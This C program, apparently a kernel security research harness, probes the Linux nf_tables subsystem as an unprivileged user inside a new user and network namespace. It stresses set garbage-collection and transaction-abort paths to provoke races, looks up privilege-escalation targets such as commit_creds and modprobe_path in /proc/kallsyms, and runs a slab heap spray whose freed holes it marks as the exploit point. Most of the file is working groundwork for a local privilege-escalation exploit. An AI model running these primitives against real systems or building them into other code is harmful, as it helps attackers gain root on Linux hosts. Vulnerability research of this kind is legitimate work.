/*
 * nft_research2.c — nf_tables attack surface research (libnftnl-based)
 * Uses libnftnl for correct protocol encoding.
 * All tests run as unprivileged user via CLONE_NEWUSER | CLONE_NEWNET.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <fcntl.h>
#include <poll.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/set.h>
#include <libmnl/libmnl.h>

/* ─── helpers ───────────────────────────────────────────────────────────── */

static struct mnl_socket *nl = NULL;
static uint32_t seq = 0;

static void nl_set_nonblock(int on) {
    int fd = mnl_socket_get_fd(nl);
    int flags = fcntl(fd, F_GETFL, 0);
    if (on) fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    else    fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);
}

static int nftnl_send_batch(struct mnl_nlmsg_batch *batch) {
    int ret = mnl_socket_sendto(nl,
                                mnl_nlmsg_batch_head(batch),
                                mnl_nlmsg_batch_size(batch));
    if (ret < 0) return ret;

    int fd = mnl_socket_get_fd(nl);
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    int last_err = 0;

    /* drain all pending responses; stop when socket goes quiet for 100ms */
    nl_set_nonblock(1);
    while (1) {
        struct pollfd pfd = { .fd = fd, .events = POLLIN };
        if (poll(&pfd, 1, 20) <= 0) break; /* 20ms quiet = done (local netlink is <1ms) */
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        if (ret <= 0) break;
        /* check for NLMSG_ERROR with non-zero error */
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        while (mnl_nlmsg_ok(nlh, ret)) {
            if (nlh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = (struct nlmsgerr *)(nlh + 1);
                if (e->error != 0) last_err = e->error;
            }
            nlh = mnl_nlmsg_next(nlh, &ret);
        }
    }
    nl_set_nonblock(0);
    return last_err;
}

static struct mnl_nlmsg_batch *batch_start(char *buf, size_t bufsz) {
    struct mnl_nlmsg_batch *b = mnl_nlmsg_batch_start(buf, bufsz);
    nftnl_batch_begin(mnl_nlmsg_batch_current(b), ++seq);
    mnl_nlmsg_batch_next(b);
    return b;
}

static int batch_end_send(struct mnl_nlmsg_batch *b) {
    nftnl_batch_end(mnl_nlmsg_batch_current(b), ++seq);
    mnl_nlmsg_batch_next(b);
    int r = nftnl_send_batch(b);
    mnl_nlmsg_batch_stop(b);
    return r;
}

/* ─── nf_tables operations ──────────────────────────────────────────────── */

static int do_add_table(const char *name) {
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    struct mnl_nlmsg_batch *b = batch_start(buf, sizeof(buf));

    struct nftnl_table *t = nftnl_table_alloc();
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);
    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, NFPROTO_IPV4);

    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(b),
        NFT_MSG_NEWTABLE, NFPROTO_IPV4,
        NLM_F_CREATE | NLM_F_ACK, ++seq);
    nftnl_table_nlmsg_build_payload(nlh, t);
    nftnl_table_free(t);
    mnl_nlmsg_batch_next(b);
    return batch_end_send(b);
}

static int do_del_table(const char *name) {
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    struct mnl_nlmsg_batch *b = batch_start(buf, sizeof(buf));

    struct nftnl_table *t = nftnl_table_alloc();
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);
    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, NFPROTO_IPV4);

    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(b),
        NFT_MSG_DELTABLE, NFPROTO_IPV4, NLM_F_ACK, ++seq);
    nftnl_table_nlmsg_build_payload(nlh, t);
    nftnl_table_free(t);
    mnl_nlmsg_batch_next(b);
    return batch_end_send(b);
}

/* key_type: 7 = ipv4_addr (NFT_DATA_TYPE_IPADDR) */
#define TYPE_IPADDR  7

static int do_add_set(const char *table, const char *name,
                       uint32_t flags, uint64_t timeout_ms) {
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    struct mnl_nlmsg_batch *b = batch_start(buf, sizeof(buf));

    struct nftnl_set *s = nftnl_set_alloc();
    nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
    nftnl_set_set_str(s, NFTNL_SET_NAME, name);
    nftnl_set_set_u32(s, NFTNL_SET_FAMILY, NFPROTO_IPV4);
    nftnl_set_set_u32(s, NFTNL_SET_KEY_TYPE, TYPE_IPADDR);
    nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, 4);
    nftnl_set_set_u32(s, NFTNL_SET_FLAGS, flags); /* must be present even when 0 */
    if (timeout_ms) nftnl_set_set_u64(s, NFTNL_SET_TIMEOUT, timeout_ms);

    struct nlmsghdr *nlh = nftnl_set_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(b),
        NFT_MSG_NEWSET, NFPROTO_IPV4,
        NLM_F_CREATE | NLM_F_ACK, ++seq);
    nftnl_set_nlmsg_build_payload(nlh, s);
    nftnl_set_free(s);
    mnl_nlmsg_batch_next(b);
    return batch_end_send(b);
}

static int do_del_set(const char *table, const char *name) {
    char buf[MNL_SOCKET_BUFFER_SIZE * 2];
    struct mnl_nlmsg_batch *b = batch_start(buf, sizeof(buf));

    struct nftnl_set *s = nftnl_set_alloc();
    nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
    nftnl_set_set_str(s, NFTNL_SET_NAME, name);
    nftnl_set_set_u32(s, NFTNL_SET_FAMILY, NFPROTO_IPV4);

    struct nlmsghdr *nlh = nftnl_set_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(b),
        NFT_MSG_DELSET, NFPROTO_IPV4, NLM_F_ACK, ++seq);
    nftnl_set_nlmsg_build_payload(nlh, s);
    nftnl_set_free(s);
    mnl_nlmsg_batch_next(b);
    return batch_end_send(b);
}

/* add N elements in a single batch for efficiency */
static int do_add_elems_batch(const char *table, const char *set,
                               uint32_t *ips, int n, uint64_t timeout_ms) {
    char buf[MNL_SOCKET_BUFFER_SIZE * 8];
    struct mnl_nlmsg_batch *b = batch_start(buf, sizeof(buf));

    for (int i = 0; i < n; i++) {
        struct nftnl_set *s = nftnl_set_alloc();
        nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
        nftnl_set_set_str(s, NFTNL_SET_NAME, set);
        nftnl_set_set_u32(s, NFTNL_SET_FAMILY, NFPROTO_IPV4);

        struct nftnl_set_elem *e = nftnl_set_elem_alloc();
        nftnl_set_elem_set(e, NFTNL_SET_ELEM_KEY, &ips[i], sizeof(ips[i]));
        if (timeout_ms)
            nftnl_set_elem_set_u64(e, NFTNL_SET_ELEM_TIMEOUT, timeout_ms);
        nftnl_set_elem_add(s, e);

        struct nlmsghdr *nlh = nftnl_nlmsg_build_hdr(
            mnl_nlmsg_batch_current(b),
            NFT_MSG_NEWSETELEM, NFPROTO_IPV4,
            NLM_F_CREATE | NLM_F_ACK, ++seq);
        nftnl_set_elems_nlmsg_build_payload(nlh, s);
        nftnl_set_free(s);
        if (!mnl_nlmsg_batch_next(b)) break; /* batch full */
    }
    return batch_end_send(b);
}

static int do_add_elem(const char *table, const char *set,
                        uint32_t ip_be32, uint64_t timeout_ms) {
    return do_add_elems_batch(table, set, &ip_be32, 1, timeout_ms);
}

static int do_del_elem(const char *table, const char *set, uint32_t ip_be32) {
    char buf[MNL_SOCKET_BUFFER_SIZE * 4];
    struct mnl_nlmsg_batch *b = batch_start(buf, sizeof(buf));

    struct nftnl_set *s = nftnl_set_alloc();
    nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
    nftnl_set_set_str(s, NFTNL_SET_NAME, set);
    nftnl_set_set_u32(s, NFTNL_SET_FAMILY, NFPROTO_IPV4);

    struct nftnl_set_elem *e = nftnl_set_elem_alloc();
    nftnl_set_elem_set(e, NFTNL_SET_ELEM_KEY, &ip_be32, sizeof(ip_be32));
    nftnl_set_elem_add(s, e);

    struct nlmsghdr *nlh = nftnl_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(b),
        NFT_MSG_DELSETELEM, NFPROTO_IPV4, NLM_F_ACK, ++seq);
    nftnl_set_elems_nlmsg_build_payload(nlh, s);
    nftnl_set_free(s);
    mnl_nlmsg_batch_next(b);
    return batch_end_send(b);
}

/* ─── KASLR (root only via /proc/kallsyms) ──────────────────────────────── */

static unsigned long sym(const char *name) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    unsigned long a = 0; char t; char n[256];
    while (fscanf(f, "%lx %c %255s\n", &a, &t, n) == 3)
        if (!strcmp(n, name)) { fclose(f); return a; }
    fclose(f);
    return 0;
}

/* ─── TEST 1: pipapo GC race ────────────────────────────────────────────── */

static void test_pipapo_gc_race(void) {
    printf("\n[TEST 1] pipapo GC race — rapid element churn under timeout\n");
    const char *T = "pgc", *S = "iset";

    do_add_table(T);

    /* NFT_SET_INTERVAL=0x4 | NFT_SET_TIMEOUT=0x10 → pipapo with GC */
    int r = do_add_set(T, S, NFT_SET_INTERVAL | NFT_SET_TIMEOUT, 50);
    printf("  create pipapo+timeout set (50ms): %s\n", r ? strerror(-r) : "OK");
    if (r) { do_del_table(T); return; }

    /* batch add 64 elements at a time, then batch-delete, let GC fire */
    int added = 0, errs = 0;
    for (int chunk = 0; chunk < 8; chunk++) {
        uint32_t ips[64];
        for (int j = 0; j < 64; j++)
            ips[j] = __builtin_bswap32(0x0a000001 + chunk * 64 + j);
        int r2 = do_add_elems_batch(T, S, ips, 64, 50);
        if (r2 == 0) added += 64; else errs += 64;

        usleep(60000); /* wait > 50ms timeout → GC fires on expiring elems */

        /* batch-delete to force pipapo clone while GC is active */
        for (int j = 0; j < 64; j++)
            do_del_elem(T, S, ips[j]);
    }
    printf("  add/del churn: %d added, %d errors\n", added, errs);
    printf("  [!] kernel anomaly → check: dmesg | grep -E 'BUG|KASAN|KFENCE'\n");

    do_del_table(T);
}

/* ─── TEST 2: rbtree abort path ─────────────────────────────────────────── */

static void test_rbtree_abort(void) {
    printf("\n[TEST 2] rbtree set — transaction abort with partial element state\n");
    const char *T = "rbt", *S = "rbset";

    do_add_table(T);
    int r = do_add_set(T, S, 0, 0); /* plain → hash or rbtree by kernel choice */
    printf("  create plain set: %s\n", r ? strerror(-r) : "OK");
    if (r) { do_del_table(T); return; }

    /* populate 1024 entries to push kernel toward rbtree backend */
    int added = 0;
    uint32_t bulk[128];
    for (int chunk = 0; chunk < 8; chunk++) {
        for (int j = 0; j < 128; j++)
            bulk[j] = __builtin_bswap32(0xc0a80001 + chunk * 128 + j);
        if (do_add_elems_batch(T, S, bulk, 128, 0) == 0) added += 128;
    }
    printf("  populated %d elements\n", added);

    /* force duplicate → transaction abort after partial activation */
    uint32_t dup = __builtin_bswap32(0xc0a80001);
    r = do_add_elem(T, S, dup, 0);
    printf("  dup insert result: %s (want -EEXIST)\n", strerror(-r));

    /* rapid add/delete cycles to stress abort cleanup */
    int ab = 0;
    for (int i = 0; i < 512; i++) {
        uint32_t ip = __builtin_bswap32(0xc0a80001 + (i % 1024));
        if (do_add_elem(T, S, ip, 0) < 0) ab++;
    }
    printf("  abort-inducing ops: %d\n", ab);

    do_del_table(T);
}

/* ─── TEST 3: dynset zero-timeout ───────────────────────────────────────── */

static void test_dynset_timeout(void) {
    printf("\n[TEST 3] dynset NFT_SET_EVAL + 1ms timeout — GC re-add race\n");
    const char *T = "dyn", *S = "dset";

    do_add_table(T);
    /* NFT_SET_EVAL=0x20 | NFT_SET_TIMEOUT=0x10 */
    int r = do_add_set(T, S, NFT_SET_EVAL | NFT_SET_TIMEOUT, 1);
    printf("  create dynset (1ms timeout): %s\n", r ? strerror(-r) : "OK");
    if (r) { do_del_table(T); return; }

    int added = 0, errs = 0;
    for (int i = 0; i < 256; i++) {
        uint32_t ip = __builtin_bswap32(0x01010101 + i);
        if (do_add_elem(T, S, ip, 1) == 0) added++;
        else errs++;
    }
    printf("  added %d elements at 1ms timeout, %d errors\n", added, errs);

    usleep(5000); /* 5ms — all should be expired */

    int readd = 0, readd_err = 0;
    for (int i = 0; i < 256; i++) {
        uint32_t ip = __builtin_bswap32(0x01010101 + i);
        if (do_add_elem(T, S, ip, 1) == 0) readd++;
        else readd_err++;
    }
    printf("  re-add after expiry: %d OK, %d err\n", readd, readd_err);
    if (readd_err > 0)
        printf("  [!] %d stale entries — GC not clearing expired elements!\n",
               readd_err);

    do_del_table(T);
}

/* ─── TEST 4: concurrent transactions (two sockets) ────────────────────── */

static volatile int t4_stop = 0;
static const char *T4 = "conc";

static void *t4_worker(void *arg) {
    struct mnl_socket *w = mnl_socket_open(NETLINK_NETFILTER);
    if (!w) return NULL;
    mnl_socket_bind(w, 0, MNL_SOCKET_AUTOPID);

    struct mnl_socket *saved = nl;
    nl = w;

    for (int i = 0; !t4_stop && i < 500; i++) {
        char name[32]; snprintf(name, sizeof(name), "wset_%d", i % 16);
        do_add_set(T4, name, 0, 0);
        usleep(200);
        do_del_set(T4, name);
    }

    nl = saved;
    mnl_socket_close(w);
    return NULL;
}

static void test_concurrent(void) {
    printf("\n[TEST 4] concurrent transactions — two sockets on same ns\n");
    do_add_table(T4);

    pthread_t wt;
    pthread_create(&wt, NULL, t4_worker, NULL);

    /* main thread: concurrent set element operations */
    for (int i = 0; i < 200; i++) {
        char name[32]; snprintf(name, sizeof(name), "mset_%d", i % 8);
        do_add_set(T4, name, 0, 0);
        for (int j = 0; j < 16; j++) {
            uint32_t ip = __builtin_bswap32(0x7f000001 + i * 16 + j);
            do_add_elem(T4, name, ip, 0);
        }
        usleep(100);
    }

    t4_stop = 1;
    pthread_join(wt, NULL);
    printf("  concurrent test complete\n");
    do_del_table(T4);
}

/* ─── TEST 5: heap spray — slab layout control ──────────────────────────── */

static void test_heap_spray(void) {
    printf("\n[TEST 5] heap spray — kmalloc slab layout for nft_set objects\n");
    /*
     * nft_set + hash backend ≈ kmalloc-512 (on 6.18 x86_64)
     * Strategy: flood with sets to massage slab state before triggering
     * a vulnerability. Here we just demonstrate the primitive.
     */
    const char *T = "spray";
    do_add_table(T);

    int ok = 0;
    for (int i = 0; i < 128; i++) {
        char name[48];
        /* Vary name length to target different kmalloc buckets */
        int pad = (i % 4) * 8; /* 0, 8, 16, 24 extra bytes */
        snprintf(name, sizeof(name), "s%03d%.*s", i, pad,
                 "AAAAAAAAAAAAAAAAAAAAAAAAA");
        if (do_add_set(T, name, 0, 0) == 0) ok++;
    }
    printf("  sprayed %d sets (slab massage complete)\n", ok);

    /* free half — create holes in slab for controlled allocation */
    int freed = 0;
    for (int i = 0; i < 128; i += 2) {
        char name[48];
        int pad = (i % 4) * 8;
        snprintf(name, sizeof(name), "s%03d%.*s", i, pad,
                 "AAAAAAAAAAAAAAAAAAAAAAAAA");
        if (do_del_set(T, name) == 0) freed++;
    }
    printf("  freed %d sets — holes created in slab\n", freed);
    printf("  [exploit point] trigger vuln here → allocate into holes\n");

    do_del_table(T);
}

/* ─── main ──────────────────────────────────────────────────────────────── */

int main(void) {
    printf("=== nf_tables Attack Surface Research (v2) ===\n");
    printf("=== Kernel 6.18.5 / Ubuntu 24.04             ===\n\n");

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("[!] unshare"); return 1;
    }
    printf("[+] user+net namespace entered (unprivileged attacker)\n");

    nl = mnl_socket_open(NETLINK_NETFILTER);
    if (!nl) { perror("[!] mnl_socket_open"); return 1; }
    mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID);
    printf("[+] mnl netfilter socket opened\n");

    /* kernel symbol addresses (only visible as root) */
    printf("\n[KASLR] key symbol addresses:\n");
    printf("  commit_creds        = %#lx\n", sym("commit_creds"));
    printf("  prepare_kernel_cred = %#lx\n", sym("prepare_kernel_cred"));
    printf("  modprobe_path       = %#lx\n", sym("modprobe_path"));
    printf("  nft_do_chain        = %#lx\n", sym("nft_do_chain"));
    printf("  _stext (base)       = %#lx\n", sym("_stext"));

    test_pipapo_gc_race();
    test_rbtree_abort();
    test_dynset_timeout();
    test_concurrent();
    test_heap_spray();

    printf("\n[CHECK] dmesg | grep -E 'BUG:|KASAN|KFENCE|WARNING:'\n");
    printf("[CHECK] cat /proc/slabinfo | grep nft  (slab state)\n");

    mnl_socket_close(nl);
    return 0;
}
